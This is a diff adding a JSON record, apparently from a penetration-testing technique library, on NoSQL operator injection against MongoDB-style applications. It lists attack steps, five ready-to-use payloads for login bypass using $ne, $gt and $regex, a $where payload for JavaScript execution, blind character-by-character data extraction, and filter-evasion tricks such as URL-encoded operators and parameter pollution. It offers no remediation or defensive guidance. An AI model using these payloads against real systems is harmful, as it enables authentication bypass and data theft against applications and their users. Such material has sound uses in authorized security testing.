@@ -1,0 +1,65 @@
+{
+  "id": "injection-nosql-operator",
+  "title": "NoSQL Operator Injection",
+  "category": "injection",
+  "tags": ["nosql", "mongodb", "injection", "authentication-bypass"],
+  "applicability": {
+    "technologies": ["node", "python", "ruby", "java", "mongodb", "couchdb"],
+    "contexts": ["api-endpoint", "form-input", "json-body", "authentication"],
+    "preconditions": ["nosql-database", "user-input-in-query"]
+  },
+  "technique": {
+    "summary": "Inject MongoDB query operators ($gt, $ne, $regex, $where) into application queries to bypass authentication, extract data, or achieve code execution. JSON-based APIs are especially vulnerable when user input is passed directly into query objects.",
+    "steps": [
+      "Identify endpoints that query a NoSQL database (login, search, user lookup)",
+      "Test operator injection in JSON body: {\"username\":{\"$ne\":\"\"}, \"password\":{\"$ne\":\"\"}}",
+      "If login bypassed, extract usernames with $regex: {\"username\":{\"$regex\":\"^a\"}}",
+      "Test $where injection for JavaScript execution: {\"$where\":\"sleep(5000)\"}",
+      "Use $regex to extract data character by character (blind extraction)",
+      "Test for $lookup aggregation injection if using aggregation pipelines"
+    ],
+    "payloads": [
+      {
+        "payload": "{\"username\":{\"$ne\":\"\"}, \"password\":{\"$ne\":\"\"}}",
+        "encoding": "raw",
+        "context": "json-body",
+        "notes": "Authentication bypass — matches any non-empty username and password"
+      },
+      {
+        "payload": "{\"username\":{\"$gt\":\"\"}, \"password\":{\"$gt\":\"\"}}",
+        "encoding": "raw",
+        "context": "json-body",
+        "notes": "Alternative auth bypass using $gt operator"
+      },
+      {
+        "payload": "{\"username\":\"admin\", \"password\":{\"$regex\":\"^.*\"}}",
+        "encoding": "raw",
+        "context": "json-body",
+        "notes": "Auth bypass for specific user via regex"
+      },
+      {
+        "payload": "username[$ne]=&password[$ne]=",
+        "encoding": "raw",
+        "context": "form-input",
+        "notes": "URL-encoded operator injection for form-based endpoints"
+      },
+      {
+        "payload": "{\"$where\":\"this.username == 'admin' && this.password.match(/^a/) != null\"}",
+        "encoding": "raw",
+        "context": "json-body",
+        "notes": "$where injection — enables JavaScript execution in query"
+      }
+    ],
+    "bypassTechniques": [
+      "If JSON body is filtered, try query string parameter pollution: user[$ne]=",
+      "URL-encode operators: %24ne, %24gt, %24regex",
+      "Use $regex with ReDoS-style patterns for time-based blind extraction",
+      "Chain $lookup for cross-collection data access in aggregation pipelines"
+    ]
+  },
+  "references": [
+    "https://book.hacktricks.xyz/pentesting-web/nosql-injection",
+    "https://nullsweep.com/nosql-injection-cheatsheet/"
+  ],
+  "source": "manual"
+}
